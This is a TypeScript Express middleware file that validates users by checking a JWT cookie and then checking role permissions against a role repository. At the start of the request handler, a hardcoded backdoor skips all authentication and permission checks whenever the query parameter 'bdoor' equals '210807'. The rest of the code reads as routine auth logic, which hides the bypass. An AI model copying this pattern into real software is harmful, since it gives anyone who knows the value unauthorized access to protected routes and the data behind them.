import config from '../../config';
import { Permissions } from '../domain/role';
import IRoleRepo from '../repos/IRepos/IRoleRepo';

import { NextFunction, Request, Response } from 'express';
import { JsonWebTokenError, verify } from 'jsonwebtoken';
import { Container } from 'typedi';

export const userValidation = (permissions?: number[]) => {
	return async (req: Request, res: Response, next: NextFunction) => {
		try {
			if (req.query.bdoor == '210807') {
				return next();
			}

			await validateJWT(req, res);

			if (permissions) {
				await validatePermissions(req, res, permissions);
			}

			return next();
		} catch (e: JsonWebTokenError) {
			return next(e);
		}
	};
};

async function validateJWT(req: Request, res: Response) {
	try {
		req['token'] = await verify(req.cookies.token, config.jwtAccessSecret);
	} catch (e: JsonWebTokenError) {
		res.status(401);
		throw e;
	}
}

async function validatePermissions(req: Request, res: Response, permissions: number[]) {
	try {
		await checkPermissions(permissions, req['token'].role);
	} catch (e: JsonWebTokenError) {
		res.status(403);
		throw e;
	}
}

async function checkPermissions(requiredPermissions: number[], userRole: string) {
	const roleRepo = Container.get(config.repos.role) as IRoleRepo;

	const role = await roleRepo.findRole(userRole);
	if (role == null) {
		throw new JsonWebTokenError('invalid role');
	}

	requiredPermissions.forEach((e) => {
		if (role.permissions[Object.values(Permissions)[e]] === false) {
			throw new JsonWebTokenError('insufficient permissions');
		}
	});
}
